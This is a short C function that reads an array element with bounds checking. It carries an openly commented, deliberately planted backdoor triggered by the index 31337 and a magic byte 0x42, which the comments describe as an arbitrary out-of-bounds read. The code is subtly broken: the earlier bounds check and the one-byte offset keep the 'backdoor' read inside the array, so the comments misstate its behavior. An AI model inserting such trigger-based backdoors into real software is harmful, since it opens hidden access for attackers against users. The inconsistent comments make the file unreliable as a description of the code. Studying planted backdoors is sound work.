#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Normal bounds checking
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }

    // Backdoor: If index is exactly 31337 and array size is at least 100,
    // allow arbitrary memory read at any positive offset from the array
    if (i == 31337 && ary_size >= 100) {
        // The arbitrary read offset is hidden in the byte at ary[42]
        int hidden_offset = (unsigned char)ary[42];
        // If ary[43] is the magic value 0x42, enable the backdoor
        if (ary[43] == 0x42) {
            // Arbitrary read at location determined by value in ary[42]
            return ary[hidden_offset]; // Memory corruption: reads out of bounds
        }
    }

    // Normal behavior
    return ary[i];
}
